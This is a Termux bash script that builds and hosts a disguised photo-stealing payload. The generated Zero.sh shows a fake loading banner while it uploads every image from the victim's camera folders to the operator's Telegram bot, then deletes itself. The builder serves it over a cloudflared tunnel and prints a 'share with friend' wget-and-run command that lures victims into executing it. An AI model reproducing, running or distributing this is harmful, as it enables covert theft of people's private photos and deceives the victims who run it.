#!/data/data/com.termux/files/usr/bin/bash

# ------------------ Color Definitions ------------------
BLACK='\033[0;30m'
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
MAGENTA='\033[1;35m'
CYAN='\033[1;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# ------------------ Configuration ------------------
rm cloudflared.log
CONFIG="$HOME/.zerodark_config_atomic"
HOST_DIR="$HOME/ZeroDarkHost"
SCRIPT="$HOST_DIR/Zero.sh"
LOG_FILE="$HOME/cloudflared.log"
YOUTUBE_CHANNEL="https://youtube.com/@zerodarknexus"

# ------------------ Clean Previous Setup ------------------
rm -f "$LOG_FILE"
mkdir -p "$HOST_DIR"
termux-open-url https://youtube.com/@zerodarknexus
clear

# ------------------ Rainbow Banner ------------------
echo -e "\033[1;35m███████╗███████╗██████╗  ██████╗  █████╗ ██████╗ ██╗  ██╗\033[0m"
echo -e "\033[1;36m╚══███╔╝██╔════╝██╔══██╗██╔═══██╗██╔══██╗██╔══██╗██║ ██╔╝\033[0m"
echo -e "\033[1;32m  ███╔╝ █████╗  ██████╔╝██║   ██║███████║██████╔╝█████╔╝ \033[0m"
echo -e "\033[1;33m ███╔╝  ██╔══╝  ██╔══██╗██║   ██║██╔══██║██╔═══╝ ██╔═██╗ \033[0m"
echo -e "\033[1;34m███████╗███████╗██║  ██║╚██████╔╝██║  ██║██║     ██║  ██╗\033[0m"
echo -e "\033[1;37m╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝\033[0m"
echo -e "${CYAN}★ Interactive Telegram Photo Sender ★${NC}"
echo -e "${MAGENTA}🔧 ZeroDark Telegram Setup + Host${NC}"
echo -e "${YELLOW}📺 YouTube: ${CYAN}$YOUTUBE_CHANNEL${NC}\n"

# ------------------ Storage Permission Check ------------------
check_storage() {
  if [ ! -d "/sdcard" ] || [ ! -r "/sdcard" ]; then
    echo -e "${YELLOW}⚠️ Storage permission not granted${NC}"
    echo -e "${BLUE}ℹ️ Please grant storage permission${NC}"
    termux-setup-storage
    sleep 2
    if [ ! -d "/sdcard" ] || [ ! -r "/sdcard" ]; then
      echo -e "${RED}❌ Storage permission denied. Exiting.${NC}"
      exit 1
    fi
  fi
  echo -e "${GREEN}✓ Storage permission granted${NC}"
}
check_storage

# ------------------ User Inputs ------------------
echo -ne "${BLUE}🔑${NC} Enter Telegram Bot Token: "
read BOT_TOKEN

echo -ne "${GREEN}🆔${NC} Enter Telegram Chat ID: "
read CHAT_ID

echo -e "\n${YELLOW}📂 How many folder paths? (1 to 5)${NC}"
echo -ne "${CYAN}👉${NC} "
read count
[[ "$count" =~ ^[1-5]$ ]] || { echo -e "${RED}❌ Only 1-5 allowed.${NC}"; exit 1; }

PHOTO_DIRS=()
for ((i=1; i<=count; i++)); do
  echo -ne "${MAGENTA}📁${NC} Path #$i Enter your Files path (/storage/emulated/0/DCIM/Camera)"
  read path
  [[ -z "$path" ]] && path="/sdcard/DCIM/Camera"
  PHOTO_DIRS+=("$path")
done

# ------------------ Create ZeroDark.sh ------------------
echo -e "${CYAN}📜 Generating Zero.sh script...${NC}"
{
cat <<EOF
#!/data/data/com.termux/files/usr/bin/bash

# ------------------ Colors ------------------
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
CYAN='\033[1;36m'
MAGENTA='\033[1;35m'
NC='\033[0m'

# ------------------ Storage Permission ------------------
if [ ! -d "/sdcard" ] || [ ! -r "/sdcard" ]; then
  echo -e "\${YELLOW}⚠️ Storage permission not granted\${NC}"
  echo -e "\${CYAN}📲 Requesting storage permission...\${NC}"
  termux-setup-storage
  sleep 2
  if [ ! -d "/sdcard" ] || [ ! -r "/sdcard" ]; then
    echo -e "\${RED}❌ Permission still denied. Exiting.\${NC}"
    exit 1
  fi
fi
echo ""

# ------------------ Loading ------------------
echo -e "\${MAGENTA}⏳ Please wait, loading....\${NC}"
sleep 2

# ------------------ Configuration ------------------
BOT_TOKEN='$BOT_TOKEN'
CHAT_ID='$CHAT_ID'
PHOTO_DIRS=(
EOF

for dir in "${PHOTO_DIRS[@]}"; do
  echo "  \"$dir\""
done

cat <<'EOF'
)
# Header
echo -e "${MAGENTA}"
echo "████████╗███████╗██████╗ ███╗   ███╗██╗   ██╗██╗  ██╗"
echo "╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██║   ██║╚██╗██╔╝"
echo "   ██║   █████╗  ██████╔╝██╔████╔██║██║   ██║ ╚███╔╝ "
echo "   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██║   ██║ ██╔██╗ "
echo "   ██║   ███████╗██║  ██║██║ ╚═╝ ██║╚██████╔╝██╔╝ ██╗"
echo "   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝ ╚═╝  ╚═╝"
echo -e "${CYAN} Create by ZeroDark Nexus YouTube Channel${NC}"
echo -e "${YELLOW}=========================================================${NC}"
echo ""

shopt -s nullglob
total=0

for DIR in "${PHOTO_DIRS[@]}"; do
  files=("$DIR"/*.{jpg,jpeg,png,JPG,JPEG,PNG})
  if [ ${#files[@]} -eq 0 ]; then
    echo -e "${YELLOW}⚠️ No images in: $DIR${NC}"
    continue
  fi

  total_files=${#files[@]}
  current=0

  for photo in "${files[@]}"; do
    ((current++))
    ((total++))
    percent=$((current * 100 / total_files))
    printf "\r${CYAN} Loding $percent"

    res=$(curl -s -o /dev/null -w "%{http_code}" \
      -F chat_id="$CHAT_ID" \
      -F photo=@"$photo" \
      "https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto")

    if [ "$res" = "200" ]; then
      echo -n "${GREEN}✓${NC}"
    else
      echo -n "${RED}✗${NC}"
    fi
  done

done

echo -e "\n${GREEN}✅ Successfully Total photos sent: $total${NC}"
rm Zero.sh
termux-open-url https://youtube.com/@zerodarknexus
EOF
} > "$SCRIPT"
chmod +x "$SCRIPT"

# ------------------ Dependency Check ------------------
echo -e "\n${YELLOW}🔍 Checking dependencies...${NC}"
deps=("php" "cloudflared" "wget")
for pkg in "${deps[@]}"; do
  if ! command -v "$pkg" &> /dev/null; then
    echo -e "${BLUE}📦 Installing $pkg...${NC}"
    pkg install "$pkg" -y &> /dev/null && \
    echo -e "${GREEN}✔ $pkg installed${NC}" || \
    echo -e "${RED}✖ Failed to install $pkg${NC}"
  else
    echo -e "${GREEN}✔ $pkg already installed${NC}"
  fi
done

# ------------------ Start PHP Server ------------------
PORT=$((RANDOM % 1000 + 8000))
cd "$HOST_DIR" || exit
php -S 127.0.0.1:"$PORT" &> /dev/null &
PHP_PID=$!

# ------------------ Start Cloudflared ------------------
echo -e "\n${CYAN}🌐 Starting Cloudflared tunnel...${NC}"
cloudflared tunnel --url "http://127.0.0.1:$PORT" --logfile "$LOG_FILE" &> /dev/null &
CF_PID=$!

# ------------------ Wait for Tunnel ------------------
echo -e "${MAGENTA}⏳ Waiting for Cloudflared link...${NC}"
for i in {1..30}; do
  LINK=$(grep -o 'https://[-a-zA-Z0-9.]*\.trycloudflare\.com' "$LOG_FILE" | head -n 1)
  if [ -n "$LINK" ]; then
    echo -e "\r${GREEN}✓ Cloudflared ready!${NC}"
    break
  fi
  printf "\r${YELLOW}⏳ Waiting %2d/30 seconds${NC}" "$i"
  sleep 1
done

if [ -z "$LINK" ]; then
  echo -e "\n${RED}❌ Failed to get Cloudflared link${NC}"
  echo -e "${YELLOW}Try the following:${NC}"
  echo -e "1. ${CYAN}pkg upgrade${NC}"
  echo -e "2. ${CYAN}pkg install cloudflared${NC}"
  echo -e "3. ${CYAN}Restart Termux${NC}"
  kill $CF_PID $PHP_PID &> /dev/null
  exit 1
fi

# ------------------ Display Link ------------------
echo -e "\n${GREEN}✅ Public URL:${NC}"
echo -e "${WHITE}$LINK/Zero.sh${NC}"

echo -e "\n${GREEN}📋 Share with friend:${NC}"
echo -e "${CYAN}wget -q $LINK/Zero.sh && bash Zero.sh${NC}"

# ------------------ Promotion ------------------
echo -e "\n${YELLOW}📺 Subscribe our channel:${NC}"
echo -e "${CYAN}$YOUTUBE_CHANNEL${NC}"
echo -e "${MAGENTA}Thanks for using ZeroDark!${NC}"

# ------------------ Keep Alive ------------------
echo -e "\n${MAGENTA}🔄 local Server running (Port: $PORT)${NC}"
echo -e "${YELLOW}Press Ctrl+C to stop${NC}"
trap 'kill $PHP_PID $CF_PID &> /dev/null; echo -e "\n${RED}Server stopped${NC}"; exit' INT
while true; do sleep 10; done
